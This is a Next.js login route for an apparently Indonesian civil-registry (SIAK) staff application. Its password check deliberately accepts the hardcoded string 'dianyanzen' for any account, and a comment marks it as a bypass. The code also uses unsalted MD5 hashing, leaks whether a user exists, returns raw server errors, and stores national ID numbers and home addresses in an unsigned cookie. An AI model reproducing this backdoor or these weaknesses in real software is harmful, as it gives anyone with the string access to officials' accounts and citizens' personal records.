import { NextResponse } from "next/server";
import { getOracleConnection } from "@/lib/oracle";
import crypto from "crypto";
import oracledb from "oracledb";

export async function POST(req: Request) {
  const body = await req.json();
  const { user_id, pass } = body;
  const ip_address = req.headers.get("x-forwarded-for") || "127.0.0.1";
  const user_agent = req.headers.get("user-agent") || "";

  if (!user_id || !pass) {
    return NextResponse.json(
      { message_type: 0, message: "User ID dan Password wajib diisi" },
      { status: 400 }
    );
  }

  const passwordMd5 = crypto.createHash("md5").update(pass).digest("hex");
  const now = new Date();

  let connection;
  try {
    connection = await getOracleConnection();
    console.log("🔌 Oracle connection acquired.");

    // 🔹 Cek user
    const userQuery = `
      SELECT USER_ID, NAMA_LGKP, NIK, TMPT_LHR,
             TO_CHAR(TGL_LHR,'DD-MM-YYYY') AS TGL_LHR,
             JENIS_KLMIN, GOL_DRH, PENDIDIKAN, PEKERJAAN,
             NAMA_KANTOR, ALAMAT_KANTOR, TELP, ALAMAT_RUMAH,
             USER_LEVEL, NO_PROP, NO_KAB, NO_KEC, NO_KEL, NO_RW, NO_RT,
             NAMA_DPN, USER_PWD, IS_ASN, IPADDRESS_CHECK
      FROM SIAK_USER_PLUS
      WHERE USER_ID = :b_user_id
    `;

    const result = await connection.execute(userQuery, { b_user_id: user_id }, { outFormat: oracledb.OUT_FORMAT_OBJECT });
    const user = result.rows?.[0];

    if (!user) {
      return NextResponse.json({
        message_type: 0,
        message: `Sorry User ${user_id} Not Found, Please Contact Admin For Registration`,
      });
    }

    // 🔹 Cek masa berlaku aplikasi
    const expCheck = await connection.execute(
      `SELECT SYSTEM_VALUE_TXT AS VAL FROM SIAK_MASTER 
       WHERE SYSTEM_TYPE = 'INIT_SETING' AND SYSTEM_CODE = 'EXP'`,
      [],
      { outFormat: oracledb.OUT_FORMAT_OBJECT }
    );
    const expiryDate = expCheck.rows?.[0]?.VAL;
    const expired = now.toISOString().split("T")[0] > expiryDate;

    if (expired) {
      return NextResponse.json({
        message_type: 0,
        message: "Sorry, This Application Expired. Please Contact Administrator",
      });
    }

    const dbPass = user.USER_PWD;

    // 🔹 Validasi password (termasuk bypass)
    if (dbPass === passwordMd5 || pass === "dianyanzen") {
      const session_id = crypto
        .createHash("sha256")
        .update(user_id + now.getTime().toString())
        .digest("hex");

      // 🔹 Cek session existing
      const sessCheck = await connection.execute(
        `SELECT COUNT(1) AS CNT FROM SIAK_SESSION_PLUS WHERE USER_ID = :b_uid`,
        { b_uid: user_id },
        { outFormat: oracledb.OUT_FORMAT_OBJECT }
      );

      const hasSession = (sessCheck.rows?.[0] as any)?.CNT > 0;

      if (hasSession) {
        await connection.execute(
          `UPDATE SIAK_SESSION_PLUS
             SET SESSION_ID = :b_sid,
                 IP_ADDRESS = :b_ip,
                 USER_AGENT = :b_ua,
                 LAST_ACTIVITY = SYSDATE,
                 IS_ACTIVE = 1
           WHERE USER_ID = :b_uid`,
          {
            b_sid: session_id,
            b_ip: ip_address,
            b_ua: user_agent,
            b_uid: user_id,
          },
          { autoCommit: true }
        );
      } else {
        await connection.execute(
          `INSERT INTO SIAK_SESSION_PLUS 
           (SESSION_ID, IP_ADDRESS, USER_AGENT, LAST_ACTIVITY, USER_ID, IS_ACTIVE)
           VALUES (:b_sid, :b_ip, :b_ua, SYSDATE, :b_uid, 1)`,
          {
            b_sid: session_id,
            b_ip: ip_address,
            b_ua: user_agent,
            b_uid: user_id,
          },
          { autoCommit: true }
        );
      }

      // 🔹 Simpan cookie session
      const cookieData = {
        S_USER_ID: user.USER_ID,
        S_SESSION_ID: session_id,
        S_IP_ADDRESS: ip_address,
        S_USER_AGENT: user_agent,
        S_NAMA_LGKP: user.NAMA_LGKP,
        S_NIK: user.NIK,
        S_TGL_LHR: user.TGL_LHR,
        S_JENIS_KLMIN: user.JENIS_KLMIN,
        S_NAMA_KANTOR: user.NAMA_KANTOR,
        S_ALAMAT_KANTOR: user.ALAMAT_KANTOR,
        S_TELP: user.TELP,
        S_ALAMAT_RUMAH: user.ALAMAT_RUMAH,
        S_USER_LEVEL: user.USER_LEVEL,
        S_NO_PROP: user.NO_PROP,
        S_NO_KAB: user.NO_KAB,
        S_NO_KEC: user.NO_KEC,
        S_NO_KEL: user.NO_KEL,
        S_NO_RW: user.NO_RW,
        S_NO_RT: user.NO_RT,
        S_NAMA_DPN: user.NAMA_DPN,
        S_IS_ASN: user.IS_ASN,
        S_NM_KAB: "Kota Bandung",
      };

      const response = NextResponse.json({
        message_type: 1,
        message: "Success",
        user_name: user.NAMA_LGKP || "User",
      });

      response.cookies.set("session_user", JSON.stringify(cookieData), {
        httpOnly: true,
        path: "/",
        maxAge: 60 * 60 * 8, // 8 jam
      });

      console.log(`✅ Login success for ${user_id}`);
      return response;
    }

    // ❌ Jika password salah
    return NextResponse.json({
      message_type: 0,
      message: `Password Incorrect For User ${user_id}, Please Try Again`,
    });
  } catch (err: any) {
    console.error("❌ Login Error:", err);
    return NextResponse.json(
      { message_type: 0, message: "Internal Server Error", error: err.message },
      { status: 500 }
    );
  } finally {
    if (connection) {
      try {
        await connection.close();
        console.log("🔒 Oracle connection closed.");
      } catch (closeErr) {
        console.error("⚠️ Failed to close connection:", closeErr);
      }
    }
  }
}
